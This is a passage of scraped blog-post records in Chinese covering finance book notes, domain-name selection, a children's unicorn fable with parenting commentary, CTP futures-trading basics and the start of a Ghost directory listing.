为了提高ROE，有三种模式可以采用，第一采用微软模式，提高销售利润率；第二种，采用沃尔玛模式，提高资产周转率；第三种，华尔街模式，提高财务杠杆。通常公司，前两种只能占据一种，后期需要引入财务相关的高管，利用第三种方式：加杠杆提高ROE。\n在流动性充沛的前危机时代，大量资本从低利率、低投资回报的日本等国流向高利率、投资机会丰富的国家，汇率上反映就是日本等国货币不断贬值。而美国则像一个巨大的对冲基金，一方面吸引海外投资到利息较低的美国债券，另一方面大量输出资本，做回报较高的股权投资。\n金融海啸中，作为全球资本流动重要幕后推手的各跨国银行集团和对冲基金遭受惨重打击，纷纷收缩战线，撤回海外投资，导致输出资本的日本和美国等国货币升值，输入资本的国家资本贬值。\n中国比较强调宏观调控，偏向凯恩斯主义。凯恩斯认为，私有经济的自我调节能力差，不可避免地产生过热-衰退的周期，主张利用政府主导的公共经济进行反周期操作。在经济过热是，政府应该调高利率和税收，减低公共开支，以防止需求过剩；在经济衰退时，政府应该增加公共开支，弥补私有经济的需求不足。\n欧元区没有中央政府，缺乏统一的财政政策，但可以通过欧洲中央银行执行货币政策，所以货币主义在欧元占据上风。货币主义学派认为，扩张性财政政策和货币政策长远看只会导致通货膨胀，对经济发展并无好处，政府应该放弃干预经济，只需要控制好货币供应量，保持物价稳定即可。\n美国则是供给学派的大本营，该学派主张降低税收和减少政府干预。\n危机前，资本充裕的职业玩家互相比拼，靠的是数学模型、相对价值，还有杠杆；后危机时代，市场的功用回归本源：作为融资方与投资方之间的中介，起资本流通渠道的作用。\n这是一本交易员写的书，详细描述了一个北大学生，怎样成为一个鲁西银行的交易员，负责债券自营。作为一个交易员除了具备良好的数学基础、金融知识，更多的还需要对市场的敏感，对人性的熟稔。债券是金融系统中十分重要的一个环节，政府机构可以通过对债券的操作，对市场流动性进行控制，企业可以通过债券融入资金，养老金、社保基金账户也特别偏好风险低容量大的债券市场。巨大的市场，良好的流动性，赋予了债券特别的地位，通过加杠杆可以改善收益率，并不会比股票收益差，反而具有更高的夏普比。整个金融系统依赖于大概率事件，倘若发生黑天鹅事件，风险很容易被刺破而弥漫开，这时，原有的体系瞬间可能就会崩塌。原有的模型会助涨踩踏事件的发生。\n","description":"","id":616,"section":"post","tags":["书籍","金融","交易"],"title":"乱世华尔街","uri":"https://www.chenshaowen.com/blog/book/the-troubled-wall-street.html"},{"content":"1. 什么是域名 1.1 域名的构成 本站完整的域名应该是这样：www.chenshaowen.com.\n注意最后面的点，通常可以省略。域名从后往前看，.com是顶级域名，chenshaowen是二级域名，www是通信协议。\n域名可以英文字母和阿拉伯数字以及横杠\u0026quot;－\u0026ldquo;组成，最长可达67个字符（包括后缀），并且字母的大小写没有区别，每个层次最长不能超过22个字母。\n1.2 为什么会有域名 以IPV4为例。\n如图红色部分，不使用域名系统，为了访问一个站点，用户需要在浏览器输入一个IP，浏览器根据用户输入的IP访问内容存放的服务器，最终返回页面给用户。互联网上有着各种各样的站点，那么用户就需要记住很多的IP才能直接访问，非常不方便。搜索引擎技术是在域名系统之后出现的。\n如图绿色部分，使用域名系统之后，用户不必记住很多的IP数字。只需要打开浏览器，输入域名，浏览器查询域名系统，获取到主机的IP，然后从主机获取内容，返回即可。\n从上面的分析，可以知道，域名的出现是为了用户更容易访问指定的网站内容。\n2. 域名分类 顶级域名包括两大类：\n2.1 一类是通用顶级域名(gTLD) .com : commercial organizations，商业组织，公司\n.gov : governmental entities，政府部门\n.net : network operations and service centers，网络服务商\n.org : other organizations，非盈利组织\n.edu : educational institutions，教研机构\n.int : international organizations，国际组织\n.mil : miltary (u.s)，美国军部 国内域名\n.tv : 电视台或频道\n.info :信息网与信息服务\n.name：一般由个人注册和使用\n.biz : 代表商业\n.name : 代表个人\n.pro代表专家\n2.2 另一类是国家及地区代码顶级域名(ccTLD) .cn : 中国\n.us : 美国\n.de : 德国\n.jp : 日本\n.cc : Cocos Islands , 科科斯群岛\n.co : 哥伦比亚共和国\n.in : 印度\n3. 域名的价值 3.1 品牌宣传 对于商业组织来说，域名最重要的用途就是品牌建设。一个好的域名比CTO还要重要。一家大型跨国公司主页使用一个很随意的域名，会给人一种山寨、不正式的感觉。即使对于APP时代来说，门户显得不那么重要，但是一个与商业组织相匹配的域名依然十分能体现这个组织的实力和正规。\n3.2 安全访问 对于域名后缀来说，org、gov.cn、edu.cn域名会有更高的权威性。\n对于Typo来说，避免用户直接访问时发生错误很重要。像谷歌，就注册启用了大量避免输入google.com出错的域名，比如googl.com，而百度就没有，baid.com跳转到一个出售页面。\n3.3 节约推广费 360buy.com，jingdong.com，jd.com，这几个都是京东的域名，明显的可以看到京东使用的域名辨识度越来越高，直接访问根本就没法出差错。也就可以节约一部分百度推广费用。\n4. 怎样选择域名 截图日期：2016年8月11日\n上面是各种域名后缀的注册存量和增量。.com 最早用于商业，具有其他域名无法比拟的影响力。.tk 采用的是免费策略。.net ，.org 也是比较早的通用域名。\n这里以公司选域名为例，选域名包括两部分：Typo 和后缀。个人选域名，自己喜欢就行。\n后缀最优的是.com。英文、双拼域名早已被注册完毕，经费充足的公司可以直接买，对于初创公司，可以试试创意域名，但是最优的还是 .com 域名，ele.me 这样成功的毕竟是少数。.com 域名还是普遍被人们接受的域名。\n如果.com在注册在自己手上了，还可以保护性的注册.cn，.com.cn，.org，.net，.cc，.co，这几个在国内被接受的域名，当然还可以保护 .biz，.xyz，.info 这样的。尽量不要注册新后缀的域名，这些域名宣传做得好，但是经不起洗礼，最终沉淀下来的几乎不会有。\nTypo部分，越短越能凸出品牌越好，要使用全英文、全数字、全拼音，尽量不要使用杂域名，例如：v078.com 。时刻记住域名的价值在于：品牌、安全、便捷。离开了这个几点，域名就没有价值。可以采用如下策略注册：\n公司名称拼音或缩写，公司英文或缩写，公司名+行业注册，创意域名。\n创意域名的范围就很广了，利用字母发音（比如，e发音易），英文发音与中文对应，等等。\n对创业公司的建议是能有双拼更好，没有也不用花费太多去买，先用创意域名，等有资金了再去买。精品域名会越来越有价值，特别是好的品牌双拼，域名具有一定金融属性，全球唯一，明显表现稀缺性。创业公司应该先选好域名，再去注册公司、商标等。\n","description":"","id":617,"section":"post","tags":["博文","域名","价值"],"title":"域名的注册与价值分析","uri":"https://www.chenshaowen.com/blog/value-of-domain.html"},{"content":"\n很久很久以前，有一片有着很多很多大树的独角兽森林，森里面生活着一只独角兽妈妈和一只小独角兽，还有很多很多的小动物。\n独角兽妈妈有着一个很漂亮的犄角，长在头上漂亮极了，她的犄角有魔法，小兔子受伤了，独角兽妈妈用她的犄角一碰，犄角上洒下的闪光落在小兔子受伤的地方小兔子的伤马上就好了，所以独角兽森林里的动物都喜欢独角兽妈妈。\n可是小独角兽没有犄角，看到妈妈的犄角很漂亮又有魔法，小独角兽就想要犄角，又哭又闹的去问妈妈该怎么得到自己的犄角\n妈妈说：每个独角兽只有经过自己的努力，通过彩色的神秘小河，通过会说话的山洞，最后爬上有着大风的雪山山顶找到仙女证明自己的善良和勇敢，许下自己的愿望，才能得到自己的犄角\n小独角兽说，那妈妈你帮我去找到仙女要到我的犄角吧，好不好嘛\n妈妈说：“不行，只有自己找到仙女才能得到自己的犄角，必须自己去”\n小独角兽 很期望得到漂亮的犄角，很希望能够拥有魔法，很希望像妈妈那样帮助独角兽森林的小动物们，他鼓起勇气，相信自己一定可以得到自己的犄角的，于是他带上自己最心爱的玩具的五彩笔准备去找仙女了。\n小独角兽刚刚启程，独角兽的妈妈就对他说：“你要记住，跟你一起去的 还有你自己的天使和恶魔，天使会帮助你得到犄角的，恶魔会想尽办法不让你得到犄角的，你要跟天使做朋友才能拿到独角兽，小心你自己的恶魔”\n小独角兽 点了点头，就上路了，刚走没多远，小独角兽的头上就蹦出了自己的天使和恶魔，恶魔说 路上太远太危险了，还是不要去了，多累啊，为了一个犄角不值得不值得。 这时天使说话了，犄角是独角兽的梦想，为了梦想再危险再困难也要去，梦想是最美好的东西了，我会帮你一起实现梦想的，加油。\n小独角兽该听天使还是听恶魔的？这时小独角兽想起了妈妈的话，妈妈说过的 天使是朋友，恶魔不是，要听天使的。而且我自己也很想得到犄角 即能像妈妈那样漂亮，又能用魔法帮助森林里的小动物。\n于是小独角兽对恶魔说：“我相信天使的，我要为了梦想的犄角 穿过神秘小河 和会说话的山洞，爬到山顶找到仙女，得到我的犄角。 我相信我自己一定可以的”\n听完这些话天使向小独角兽笑了笑点点头说“你真是个有梦想的好孩子”，而恶魔失败了，他生气的消失了（变没了）。\n小独角兽 向着彩色的神秘小河走啊走啊，走了3天3夜，终于听到小河流水的哗啦啦的声音了，小独角兽一下子高兴了起来，我们终于到达彩色的小河了，终于到了。\n但小独角兽 走近一看，这条小河不是彩色的，它是黑色的，而且这条河好宽好宽啊，根本过不去的，这是怎么回事呢，这时天使和恶魔又出来了，恶魔说你看走了这么久还没找到彩色的神秘小河，走错路了吧，我们还是回去吧，小独角兽伤心的看着天使，天使说：“不要灰心，遇到困难我们应该想办法，我们可以问问有没有人知道这条和到底是不是彩色的神秘小河”\n小独角兽想了想“真是这样，我们努力走了3天3夜才到这里的，不能灰心，要想办法”。于是小独角兽 大声喊，有没有人啊？有没有人帮帮我啊……。不一会远处传来一个尖尖的声音：“是谁啊？是谁需要帮忙啊？” 小独角兽往河对岸一看原来是一只松鼠\n小独角兽说：“你好，我是小独角兽，请问这里是彩色的神秘小河吗？这河怎么是黑色的？”\n小松鼠说：“哦，你好，我叫tick，这里是彩色的神秘小河，这条河以前是彩色的，是因为河里面有透明的蝌蚪，他们吃着彩色的草长大，所以小河就是彩色的，但现在没有彩色的草了，小蝌蚪们都在水底睡觉了，睡觉的时候这些蝌蚪就变成黑色的了，所以河水就变成黑色的了，以前我还可以每天看到各种颜色可开心了，但现在只能看到黑色了，我的心也伤透了”\n这时天使出来对小独角兽说：“小独角兽，你的五彩笔就是用神秘的彩色草做的啊，你可以把你的五彩笔送给小蝌蚪们，让他们变成彩色的蝌蚪啊”\n小独角兽说：“不行不行，这是我最喜欢的东西了，我可以用它画出很漂亮的画来，我不能给小蝌蚪”\n恶魔跳出来说：“对啊对啊，不能把自己最喜欢的东西给别人，这样自己就不开心了”\n天使又对小独角兽说：“帮助别人是最开心的事了，别人开心你自己也会开心的，虽然你失去了你的五彩笔会伤心，但你想一想你的梦想是得到犄角会不会很开心，帮助别人，实现自己的梦想是最开心的事儿了。”\n小独角兽想了想，天使说的对，妈妈也经常帮助别的小动物的。\n于是小独角兽对恶魔说：“我要帮助 小蝌蚪和小松鼠tick，让他们开心起来，我自己还有梦想，不会不开心的”\n恶魔听了摇摇头，伤心的消失了。\n小独角兽对 小松鼠tick说 我们把我的五彩笔 送给小蝌蚪们吧，让小河变回彩色，小松鼠tick听了好开心啊，连连点头。于是小独角兽吧五彩笔丢掉了河里，五彩笔慢慢的化开了，变成了很多很多彩色的草，好多好多小蝌蚪们开始使劲的吃起了来，不一会小河就变回了彩色的神秘小河。\n小独角兽和小松鼠tick都很开心，开心的跳起了舞。而突然 恶魔又出现了，他嘿嘿嘿坏笑着说你们再高兴也没用，河水太宽了，你过不去河的，你过不去河的。\n小独角兽这时可着急了，这么宽的河怎么办啊，这时彩色的神秘小河哗啦哗啦的响了起来，小蝌蚪们都游向了小独角兽这边，在很多很多的蝌蚪里面，有一个蝌蚪国王，它跳起来对小独角兽说：“小独角兽不要着急，你刚刚帮助了我们，让我们吃上了彩色的草，变成了彩色的蝌蚪，现在我们该帮助你了”。说完之后小蝌蚪们游啊游啊从小河的这边游到小河的那边，变成了一个蝌蚪做的小桥，这个小巧是由彩色的蝌蚪变的，所以这个桥有着各种各样的颜色，就像彩虹一样漂亮，蝌蚪国王说你从这座桥上过去吧。\n小独角兽好开心啊，他从彩色蝌蚪桥上面走到了河对岸。小松鼠tick问他你要去哪里？ 小独角兽说：“我要去往会说话的山洞，然后去往有大风的雪山去找仙女姐姐要我的犄角” 小松鼠TICK说，你让我又看到了彩色的小河，我很开心，雪山可冷可冷了，我送你一件小衣服吧，这件小衣服是用松脂做的，可以抵御雪山的寒冷。 小独角兽连连感谢小松鼠tick，跟小松鼠tick 和蝌蚪们说再见之后，小独角兽又继续向会说话的山洞前进。\n走着走着在走过一棵大树后突然听到“不许看、不许看……（低沉的声音）”，发出声音的地方是一个像房子那么大的一个山洞，声音就是从那里面发出来的。\n小独角兽开心的叫着：“我到了，我到了，我到会说话的山洞了”，小独角兽蹦蹦跳跳的往山洞跑去。\n到了山洞边上，小独角兽看到了一个很漂亮的门，里面散发着漂亮的光，小独角兽很好奇，就想进去看看，但山洞里一直发出“不许看，不许看……”的声音，这时天使出来说，山洞说不许看，我们应该小心点，还是不要看了，继续赶路吧。可是小独角兽 看到漂亮的门非常想看看里面是什么样子，于是下独角兽说：“不嘛、不嘛我就要看，我就要看” ，这时恶魔也蹦了出来说：“就是就是，想看就看嘛”，天使说：“可能有危险，不要看不要看”，小独角兽忘记了妈妈的话，没有听天使的，慢慢的走向那扇漂亮的门。\n突然，一直大熊跳了出来，拦住了小独角兽说：“不许看！不许看！”，小独角兽被吓的跳了起来，然后很生气的对大熊说：“我就要看，我就要看，这么漂亮的门我就想看看里面是什么”。大熊摆摆手说：“不许看，里面有一条大蛇，你一接近门，就会被它吃掉，我在山洞里天天都告诉路过的人不许看不许看，结果还是有很多不听话（不听别人意见）的人被大蛇吃掉了，为了不让更多的人被大蛇吃掉，我只能天天在这里喊 不许看 不许看，我都没有时间去找吃的了，也没时间出去玩，你一定要听我的”。\n小独角兽一听，吓得浑身的汗毛都竖起来了，这时天使出来说：“应该听大熊的，它是大人（有经验的人），大人知道的事情多，应该听他的”，小独角兽终于想起妈妈的话了，天使是我的朋友，我应该听天使的话。于是他对大熊说：“谢谢你提醒我，要不我就被大蛇吃掉了，谢谢你”\n大熊点点头，走回到山洞里面，继续提醒着别人“不许看、不许看……”，小独角兽告别了大熊，一边走，一边想，大熊每天在那里提醒别人不许看不许看的自己都没有时间找吃的，也没有时间玩了，多可怜啊，我应该怎么帮助他呢？这时天使跳出来说：“你应该先去实现自己的梦想，得到了犄角之后有了魔法才能帮助大熊”，小独角兽点点头，继续往前走啊走啊。\n又走过了3天3夜，小独角兽终于走到了刮着大风的雪山前面，它高兴的叫着：“我到了，我到了，我终于到了雪山了”，雪山上刮着大风“呼~ 呼~ 呼~~~~”，好大好大的风啊。\n小独角兽艰难的一步一步的向山顶爬去，忽然一阵大风把小独角兽吹倒了，这时恶魔蹦了出来说：“快回去吧，不要再往前走了，风太大了，风太大了”。天使说：“要克服困难才能拿到梦想的犄角”。小独角兽慢慢的站起来继续的爬啊爬，他对天使说：“我们一定能拿到梦想的犄角的”\n小独角兽继续在呼~呼呼呼~~的大风中爬着，雪越来越大，越来越大，天气越来越冷，小独角兽都快被冻僵了，它被冻的实在是走不动了，这时恶魔又蹦出来说“快回去吧，不要再往前走了，雪太大了，雪太大了，回到妈妈的身边就不冷了”，天使说“要克服困难才能拿到梦想的犄角，要想个好办法才能抵御寒冷”，这时小独角兽突然想起来小松鼠tick送给他的松脂做的衣服可以抵御寒冷，于是小独角兽穿上松脂做的衣服继续向山顶爬啊爬，他对天使说：“我已经长大了，我能够想办法克服困难，我们一定能拿到梦想的犄角”，天使对他微笑着点点头，恶魔又伤心的消失了。\n小独角兽走啊走啊，他走过了悬崖，穿过了大风和大雪，在走过一片长满彩色小草的草原后他终于到了山顶，在远处有一棵快要死掉的大松树下，有一个有着蝴蝶翅膀的仙女，她拿着魔法棒，身上的衣服闪闪发光，她从快要死掉的大松树下面挥动着魔法棒环绕着大树一直飞到大松树的树顶上，在魔法棒洒下的闪光落在树上的时候，大松树就活了，它冒出了绿色的枝丫，逐渐恢复了生机。\n小独角兽高兴的叫着：“我到了，我到了，我终于到山顶了，我找到仙女了”，小独角兽欢快的跑到仙女面前跟仙女说：“我想得到我的犄角，请仙女帮帮我”\n仙女飞在半空中问小独角兽：“我只能把犄角给善良的独角兽、给听话的独角兽、给坚强的独角兽，你是吗?”\n小独角兽蹦蹦跳跳的说：“我是，我是。我帮助了小蝌蚪们，我付出了我的五彩笔让他们吃到了彩色的草，让彩色小河恢复了生气，我是善良的独角兽。我听了大熊的话没有去看那扇门，我是听话的独角兽（谦虚，听别人的意见等等）。我不怕大风大雪爬上了山顶，我是坚强勇敢的独角兽”，天使出现了在旁边点点头，恶魔却再也没出来，小独角兽和他的天使一起战胜了恶魔。\n仙女说我看看，于是她晃动着魔法棒，看到了小独角兽走过彩色小河、会说话的山洞、爬上了刮大风的雪山，然后也点了点头说：“你真是 善良、听话、坚强、勇敢的独角兽，我要把你的犄角送给你”\n仙女挥动了她的魔法棒，魔法棒洒下的闪光落在了独角兽的头上，独角兽的犄角慢慢的从小独角兽的头上长了出来，小独角兽终于有了漂亮的犄角，他终于实现了他的梦想，他欢快的在山顶上跳来跳去。\n仙女扇动着她那闪闪发光透明的翅膀来到了小独角兽面前，跟小独角兽说：“善良、勇敢又坚强的小独角兽，你要记得做一个好孩子，否则你的犄角就会消失。”小独角兽连连点点头，欢快的向山下走去了。\n在走到山顶那片彩色草原的时候 天使告诉他 应该记得感谢那些帮助过你的人，小独角兽想起了彩色小河的小蝌蚪们，他们需要彩色的草，于是小独角兽采了很多很多彩色草的种子，欢快的下山了。\n在他到了会说话的山洞时，他晃动着他的犄角使用魔法冰冻住了那个漂亮的门，然后对大熊说：“谢谢你提醒了我，没让我去看那个漂亮的门，要不然就被蛇吃掉了，谢谢你。 为了感谢你，我用魔法冻住了那个漂亮的门，大蛇再也不能吃小动物了，你现在可以出去玩，出去找吃的了” ，大熊听了以后高兴极了，连连向小独角兽挥手再见，然后就一溜烟的跑到旁边的森林里面去了（大熊走了之后山洞里面静悄悄的一点声音都没有，原来啊，会说话的山洞是因为大熊在里面叫\u0026mdash;这个让孩子自己想）。\n小独角兽离开了会说话的山洞，继续往回走，走到了彩色的神秘小河，小河还是那么宽，走是走不过去的，但现在小独角兽已经得到了自己的犄角，这时他晃了晃自己的犄角，在河上面慢慢的变出了一个漂亮的彩虹桥，小独角兽走过彩虹桥到了河对岸，他喊：“小松鼠tick……蝌蚪国王……，我已经得到了我的犄角，我来给你们送彩色草的种子来了”\n小松鼠tick和蝌蚪国王高兴的过来迎接小独角兽，他们一起把种子撒到彩色的神秘小河里，这时小河的颜色变得更加鲜艳了。蝌蚪国王连连称赞：“你真是一个善良的独角兽啊”\n小独角兽离开了彩色的神秘小河，终于回到了妈妈身边，他飞奔着跑向自己的妈妈，一边跑，一边高兴的叫着：“妈妈，妈妈 我得到自己的犄角了，我得到自己的犄角了”，独角兽妈妈和小独角兽拥抱在一起，妈妈说：“孩子，你跟随自己天使的指引，勇敢的穿越了大风大雪得到了自己的犄角，还记得在得到犄角以后回去报答那些帮助过你的人，你真是长大了”从此小独角兽和妈妈在独角兽森林里过上了幸福快乐的生活。\n故事设计分解与教育应用：\n小独角兽：寓意为小孩自己，希望孩子坚强勇敢善良听话\n天使、恶魔：寓意成善于恶，对与错。在故事完成灌输之后，在生活中各种事情都可以用天使说、恶魔说等方式去引导孩子。天使说的话可以无限扩展\n犄角：其实应该是角，但在孩子耳朵里 角和脚 他们是分不清的，容易混淆，所以给孩子讲的时候还是叫犄角。 获得犄角是 隐喻着孩子做一件事情或者大人引导孩子做一件事情或者是玩，在过程中 让孩子记得勇敢、坚强、和善良，比如玩着的时候孩子摔倒了，要哭，你就可以提醒他，你看小独角兽被风吹倒时都没哭，它自己站起来继续走，以此来引导孩子。\n获得犄角后的魔法：比喻小孩子获得技能后要用于帮助他人，和帮助自己解决问题。\n犄角会消失：设计最后一段仙女的提醒时，是告诉小朋友做坏事，不听话 犄角要消失的\n五彩笔：比喻成孩子最珍贵的玩具、东西，告诉他们善于分享，不要小气，遇到还在自私的时候可以拿五彩笔这段说说，你看独角兽都把五彩笔给小蝌蚪了。\n回程：回程的路线是告诉孩子要感谢、感恩，在得到别人帮助时用这段来引导引导\n仙女：同上帝之概念，最后一段仙女用魔法棒看小独角兽是否善良勇敢这段可以告诉孩子，自己做的事情仙女都能看到，进行自我教育。比如还在在做意见错事的时候，你就可以说仙女看到了你做坏事了，要收回你的犄角了。\n大风大雪：暗喻困难、委屈等等\n漂亮的门：暗喻欲望（开始给孩子讲的时候 只是想让孩子听话就行了，还在再大点，可以逐渐的说明漂亮门后面是欲望的概念，例如还在一定要买个玩具的时候，可以教育说要听大熊的话，控制自己的欲望。）\n大熊：比喻有经验的人，让孩子吸取别人的经验不要任性。比如说某叔叔说的是对的，你要听，因为他跟大熊一样是大人，大人知道的多。\n小松鼠：是我孩子经常看动画片的一个角色，所以加进去了，没什么特别的，只是为了吸引孩子的兴趣，如果你的孩子有他特别熟悉的动画角色，也可以替换这个角色。会说话的山洞也是如此，只为了吸引孩子的兴趣，可以用自己孩子感兴趣、好奇的东西代替。\n","description":"","id":618,"section":"post","tags":["独角兽","故事"],"title":"独角兽的故事","uri":"https://www.chenshaowen.com/blog/story-unicorn.html"},{"content":"中文书名: 货币崛起:金融如何影响世界历史\n英文书名: The Ascent of Money: A Financial History of the World\n作者: [英]尼尔·弗格森\n出版年: 2009-6\nISBN: 9787508615073\nNotes:\n货币实际上就是一个信任问题，甚至是一种信仰：信任体现于货币的发行中，个人使用或者机构兑现支票或转让支票。货币不是金属，而是一种记名信托。\n通过持续的通货膨胀，政府可以很隐蔽地没收公民相当一部分的财富。\n通货膨胀率的上涨削减了投资资本总额和应得利息的购买力。这解释了，市场上稍微有通货膨胀的风吹草动，债券的价格就会出现下滑的趋势。\n作者是一位历史学家，对货币、债券、股票、保险的发展崛起分别进行了梳理。债券市场由于巨大的容量和低风险，常作为战争资金的来源，同时也推动着金融创新的发展。美国经济发展的驱动因素是消费和房产，书中还分析了次贷危机的演变过程，在我读过的另外一本书，金融的本质中也有提到。债券部分的印象非常深刻，正在读的书，乱世华尔街阅读笔记中会有更详细的描述。\n扩展：\n这本书的作者著有畅销书《纸和铁》、《现金关系》、《帝国》、《巨人》、《世界战争》。此外还撰写并制作了四部非常成功的电视纪录片《帝国》、《美国巨人》、《世界战争》,《货币崛起》。\n","description":"","id":619,"section":"post","tags":["书籍","货币","金融"],"title":"货币崛起","uri":"https://www.chenshaowen.com/blog/book/the-ascent-of-money.html"},{"content":"1. 综合交易平台（CTP）简介 综合交易平台是由上海期货信息技术有限公司以上海期货交易所的交易系统为基础，专门为期货经纪公司而开发的一套期货经纪业务管理系统，整个系统由交易、风险控制(简称为风控)和结算三大系统组成。系统能够同时连通国内四家期货交易所，支持国内商品期货和金融期货的交易、结算业务，并能够自动生成和报送反洗钱监测分析中必及保证金监控中心的文件\n交易系统。主要负责订单处理、行情转发及银期转账等业务; 结算系统。负责账户管理、经纪人管理、保证金设置、交易管理、资金管理、费率设置、日终结算、信息查询等; 风控系统。主要在盘中进行高速的实时试算，以便及时揭示并控制风险; 2. CTP的API介绍 CTP的API是上海期货信息技术有限公司专门为第三方接入开发提供的，\n基于C++的类库,通过使用和扩展类库提供的接口来实现交易的相关功能，包括交易日获取、投资者信息查询、合约查询、报单的录入、报单的撤销、报单的挂起、成交单查询等。\n最新的文档可以在上海期货信息技术官网下载。\n3. 程序化交易简介 程序化交易(Program Trading)，又称程式交易，指利用行情软件和计算\n机程序，借助于市场技术指标，由事先设定程序计算出买点和卖点，计算机自动根据其信号计算并进行买进或卖出的动作，而不以操作人的看法进行操作。\n比较有影响力的商用系统有文华财经、交易开拓者、金字塔、MC等\n程序化交易的优点：保持客观性，速度优势，收益和风险的计量分析，多元化，持续关注市场的优势。\n程序化交易的缺点：无法回避的小概率事件，出现资金大幅回撤，交易系统滞后于价格变化，缺少灵活性，需要使用者具有极大的耐也和纪律。\n交易初始化时序图：\n行情初始化时序图：\n4. 完整的程序化交易系统 一个完整的程序化交易系统的组成步骤:\n交易策略的提出、 交易对象的筛选、 交易策略的公式化、 交易系统的统计检验、\n交易系统的实战检验(包括前期的实时行情模拟和小资金、低持仓的实盘检验)、 交易系统的检测与维护 简单的讲就是将一些投资经验和策略方法，首先通过量化、公式化，变成计算机\n可识别的计算机语言，并通过历史数据进行统计和成功率的检验，再次使其能够通过不同的品种和市场，不同周期的历史数据检验后进行实盘，最终在实践的检验中进行不断的调整和完善。涉及的方面有，市场的选择、头寸规模、入市、止损、离市、买卖的技巧。\n一般通过CTP交易上期所和中金所的品种速度会很快，可达到10-15ms左右，而交易大商所和郑商所的品种就相对较慢,差不多90ms，有时候甚至更高。整个期货市场又以参与上期所的金属期货和中金所的金融期货交易的投资者居多，所以基于CTP的程序化交易系统更是有其用武之地。\n5. 策略开发生命周期 建模；金融工程师或者个人程序化交易系统开发者根据某些特定的数学模型、市场规律现象，构建出交易思想，进而整理形成策略。 策略开发；通过计算机语言将策略编写为计算机可以识别的代码，再通过编程工具编译策略代码生成自动化交易程序。 回测复盘；基于历史数据(Tick和K线),驱动策略运行，产生买卖。信号,依据虚拟的成交记录计算出资产线，最大回撤、夏普比率等策略评价指标,并进一步对参数进行优化，以便最佳参数的效果。 实盘；使用实时行情源驱动策略运行,集成实盘的下单通道，连接期货经纪公司的CTP柜台系统,用少量真实资金进行交易，以检验实盘效果。 ","description":"","id":620,"section":"post","tags":["程序化交易","交易平台","整理"],"title":"程序化交易-CTP","uri":"https://www.chenshaowen.com/blog/ctp-101.html"},{"content":"中文书名: 金融的本质:伯南克四讲美联储\n英文书名: The Federal Reserve and the Financial Crisis\n作者: 【美】伯南克\n出版年: 2014-4\nISBN: 9787508644097\nNotes:\n2008年金融危机的主要原因在于：金融机构对自身风险管理能力过度自信，人人坚信房价会持续上涨，银行认为抵押贷款可以轻易转售出去，国际客户对“安全性”资产存在大量需求。如果房价上涨，那么提供次级住房抵押贷款就是一项利润可观的金融业务。\n房价下跌时，金融系统受到的冲击应该与一类股票下跌相当，远不该影响如此之广。真正让危机蔓延的是房屋信贷背后的衍生品。房利美和房地美两家并不直接提供贷款给购房者，而是购买银行的贷款，再将房屋信贷证券化，销售给投资者。显然，这种良莠不齐的证券不容易找到市场，投资机构非常聪明的将房屋信贷打包成各个信用等级的证券再发行。AAA评级的证券很快被销售，剩下的风险比较大的证券。美国国际集团等保险公司也从事以这种证券为标的保险业务。购买他们提供的信用衍生品，这些证券就可以获得AAA的评级。这些操作并没有使以这些证券为基础的资产质量得到改善，反而为风险在整个金融体系中的扩散创造了条件。\n长期来看，金本位能够维持币值的稳定，能够让通货膨胀水平保持稳定，但是短期来看（差不多五年或十年内），通货膨胀或通货紧缩显现很多。因为在金本位制度下，经济中的货币总量会随着黄金开采量等因素的变化而变化。\n1934年，存款保险制度建立后，每年的银行倒闭数量有数千计逐渐降低到零。即使银行倒闭，普通用户也能拿回自己的钱，因此他们就没有动机再去银行挤兑了。\n1951年签署的《美联储-财政部协议》，意味着美国政府第一次明确承认，美联储应该被独立运行。当今世界各国已经形成共识，央行独立运行会被由政府主导更好，不必理会短期政治压力。\n最终导致了2008年危机的一个关键事件是房价的大幅上涨。\n这些住房抵押贷款分布与不同的证券之中，并在不同的市场上流动，也没人知道谁将遭受损失。这给金融市场带来了很大的不确定性。\n一个体系中若有一些企业“大而不倒”，那么这个体系一定存在某些根本性缺陷。如果因为规模大而得到救助，对其他企业非常不公平。而且会激励这些大公司过度冒险。\n","description":"","id":621,"section":"post","tags":["书籍","金融"],"title":"金融的本质","uri":"https://www.chenshaowen.com/blog/book/reserve-crisis.html"},{"content":"中文书名: 定位 - 有史以来对美国营销影响最大的观念\n英文书名: Positioning-The Battle for Your Mind\n作者: 杰克·特劳特（Jack Trout） / 阿尔·里斯（AL Ries）\nNotes:\n对于新的行业或产品，第一家公司是很容易在客户心中形成深入影响的，同时如果公司很成功，人们还会一个行业或产品与该公司相关联，比如百度表示搜索、淘宝表示网购。\n新的领域人们的心智很容易给公司找到空位，对于之后进入该领域的公司来说，必须通过给已经占据人们心智的竞争对手重新定位来创建空位。\n一旦旧理念被推翻，推广新概念往往就变得简单至极。事实上，人们往往会主动寻找一个新的理念去填补由此造成的空白。重新定位的关键在于从根本上动摇现有的观念、产品或人。\n最容易毁掉一个品牌的做法是品牌延伸。\n名字是橡皮筋。它可以拉长，但是不能超出某个极限。此外，你把名字延伸得越长，它就变得越脆弱。\n定位的一个基本原则是，避开那些人人都在谈论的领域，即风尚。若要取得发展，公司必须开辟无人涉足的新领域。\n为了使自己成为化学工业里公认的领头羊，孟山都都必须做一个领先企业应该做的事情，这就是为全行业说话。\n不为人知，就没有生意。\n复杂是定位的大敌，简单是定位的真谛。\n你不能对客户心里早已存在的事物置之不理。\n定位工作就是寻找那些显而易见的东西；它们是最容易传播的概念，因为它们对信息接收者的意义最大。\n预期销量小、竞争激烈、没有广告费用支持、非创新产品、上门推销的，可以使用品牌扩展策略。\n开发一项新概念或一个拥有新定位的产品，并且给它起一个与之相称的名字。\n使用全名比缩写的公司更好。公司没有形成很大影响力之前，使用全名更具有识别性，等到公司处于绝对领导地位再使用缩写代表公司。\n","description":"","id":622,"section":"post","tags":["书籍","市场"],"title":"定位","uri":"https://www.chenshaowen.com/blog/book/positioning.html"},{"content":"Ghost版本:\u0026ldquo;version\u0026rdquo;: \u0026ldquo;0.9.0-beta.2\u0026rdquo;\n|\u0026mdash; content 内容目录\n| |\u0026mdash; apps 目录，暂时为空，以后可能Ghost上能直接部署app\n| |\u0026mdash; data 数据库文件夹\n| |\u0026mdash; images 图片文件夹\n| |\u0026mdash; themes Ghost主题文件夹\n|\u0026mdash; core 核心模块目录\n| |\u0026mdash; client 客户端代码文件夹\n| |\u0026mdash; server 服务器端代文件夹\n| |\u0026mdash; shared 共享文件夹\n| |\u0026mdash; test 测试文件目录\n| |\u0026mdash; index.js 服务器启动入口\n|\u0026mdash; config.example.js 配置文件实例\n|\u0026mdash; Gruntfile.js 